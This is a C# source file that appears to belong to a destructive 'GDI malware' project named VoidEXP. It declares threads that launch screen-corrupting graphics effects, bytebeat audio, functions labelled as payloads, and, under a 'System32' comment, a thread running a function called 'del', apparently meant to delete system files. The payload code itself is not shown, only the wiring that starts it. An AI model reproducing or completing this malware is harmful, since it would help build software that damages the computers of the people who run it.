using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using static VoidEXP.GDI;
using static VoidEXP.Bytebeat;
using static VoidEXP.SystemPayloads;

namespace VoidEXP
{
    class Threads
    {
        // GDI
        public static Thread g1 = new Thread(GDI1);
        public static Thread g2 = new Thread(GDI2);
        public static Thread g3 = new Thread(GDI3);
        public static Thread g4 = new Thread(GDI4);
        public static Thread g5 = new Thread(distorc);
        public static Thread g6 = new Thread(GDI5);
        public static Thread g7 = new Thread(GDI6);
        public static Thread r = new Thread(rotate);
        public static Thread p = new Thread(pixel);
       
        // ByteBeat
        public static Thread b1 = new Thread(Bytebeat1);
        public static Thread b2 = new Thread(Bytebeat2);
        public static Thread b3 = new Thread(Beep);
        public static Thread b4 = new Thread(Bytebeat4);
        // Payloads
        public static Thread p1 = new Thread(Payload1);
        public static Thread p2 = new Thread(triangle);
        // System32
        public static Thread ds = new Thread(del);
    }
}
